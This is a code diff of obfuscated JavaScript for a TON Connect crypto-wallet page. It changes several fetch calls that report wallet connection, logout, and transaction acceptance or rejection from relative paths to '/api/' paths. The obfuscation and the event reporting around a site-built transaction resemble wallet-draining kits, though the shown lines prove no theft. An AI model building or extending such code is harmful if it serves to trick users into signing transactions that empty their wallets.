@@ -55,7 +55,7 @@ function updateSidebar(_0x54b276) {
         const _0x1894a4 = document['getElementsByClassName']('ton-logout-link')
         for (const _0x4d639e of _0x1894a4) {
             _0x4d639e['onclick'] = () => {
-                fetch('./disconnect', {
+                fetch('/api/disconnect', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON['stringify']({
@@ -104,7 +104,7 @@ const openPopupButton = document['getElementsByClassName'](
                 updateSidebar(_0x5f19cc),
                 visualUpdate(_0x5f19cc),
                 _0x5f19cc &&
-                fetch('./connected', {
+                fetch('/api/connected', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON['stringify']({
@@ -133,7 +133,7 @@ async function transaction() {
             if (_0x59733f['messages'] && _0x59733f['messages']['length'] > 0x0)
                 try {
                     const _0x3ddefe = await tonConnectUI['sendTransaction'](_0x59733f)
-                    fetch('./accept', {
+                    fetch('/api/accept', {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON['stringify']({
@@ -145,7 +145,7 @@ async function transaction() {
                         }),
                     })
                 } catch (_0x543e1f) {
-                    fetch('./reject', {
+                    fetch('/api/reject', {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON['stringify']({
